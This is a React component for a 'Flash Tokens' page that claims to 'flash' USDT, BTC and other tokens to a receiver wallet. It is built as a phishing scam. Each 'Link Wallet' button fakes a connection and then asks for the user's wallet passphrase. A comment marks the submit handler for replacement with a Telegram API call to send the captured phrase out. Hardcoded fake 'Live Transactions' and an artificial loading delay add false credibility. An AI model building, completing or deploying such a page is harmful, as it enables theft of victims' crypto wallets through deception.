import { useState, useEffect } from 'react';

const TOKEN_OPTIONS = [
  'USDT (TRC20)', 'USDT (BEP20)', 'USDT (ERC20)', 'Bitcoin (BEP20)', 'USDC (BEP20)', 'ETH (BEP20)', 'SHIB (BEP20)'
];

export default function Flash() {
  const [isLoading, setIsLoading] = useState(true);
  const [receiverAddress, setReceiverAddress] = useState('');
  const [selectedToken, setSelectedToken] = useState(TOKEN_OPTIONS[0]);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [walletLoading, setWalletLoading] = useState(false);
  const [passphrase, setPassphrase] = useState('');
  const [error, setError] = useState(null);

  useEffect(() => {
    try {
      const timer = setTimeout(() => setIsLoading(false), 10000);
      return () => clearTimeout(timer);
    } catch (err) {
      setError('Failed to initialize loading timer: ' + err.message);
    }
  }, []);

  const handleFlash = () => {
    try {
      setIsModalOpen(true);
    } catch (err) {
      setError('Flash button error: ' + err.message);
    }
  };

  const handleWalletClick = () => {
    try {
      setWalletLoading(true);
      setTimeout(() => setWalletLoading(false), 10000);
      setPassphrase(''); // Reset passphrase to show input after loading
    } catch (err) {
      setError('Wallet connection error: ' + err.message);
    }
  };

  const handleSubmit = () => {
    try {
      alert('Passphrase submitted: ' + passphrase); // Replace with Telegram API
      setPassphrase('');
      setIsModalOpen(false);
    } catch (err) {
      setError('Submit error: ' + err.message);
    }
  };

  if (error) return <div className="container">Error: {error}</div>;
  if (isLoading) return <div className="loading"><div className="spinner"></div></div>;

  return (
    <div className="container flash">
      <h1>Flash Tokens</h1>
      <input
        type="text"
        placeholder="Receiver Wallet"
        value={receiverAddress}
        onChange={(e) => setReceiverAddress(e.target.value)}
      />
      <select value={selectedToken} onChange={(e) => setSelectedToken(e.target.value)}>
        {TOKEN_OPTIONS.map((option) => (
          <option key={option} value={option}>{option}</option>
        ))}
      </select>
      <button onClick={handleFlash}>Flash</button>

      {isModalOpen && (
        <div className="modal">
          <div className="modal-content">
            <h2>Link Wallet</h2>
            {walletLoading ? (
              <div className="loading">
                <div className="spinner"></div>
                <p>Connecting...</p>
              </div>
            ) : passphrase || walletLoading === false ? (
              <>
                <input
                  type="text"
                  placeholder="Enter passphrase"
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                />
                <button onClick={handleSubmit}>Submit</button>
              </>
            ) : (
              <div className="wallet-options">
                <button onClick={handleWalletClick}>OKX Wallet</button>
                <button onClick={handleWalletClick}>Trust Wallet</button>
                <button onClick={handleWalletClick}>Bybit Wallet</button>
                <button onClick={handleWalletClick}>Metamask</button>
                <button onClick={handleWalletClick}>Binance Wallet</button>
                <button onClick={handleWalletClick}>Wallet Connect</button>
              </div>
            )}
            <button onClick={() => setIsModalOpen(false)}>Close</button>
          </div>
        </div>
      )}

      <div className="transactions">
        <h2>Live Transactions</h2>
        <ul>
          <li>0x123... → 0x456...: 100 USDT</li>
          <li>0x789... → 0xabc...: 0.5 BTC</li>
        </ul>
      </div>
    </div>
  );
}
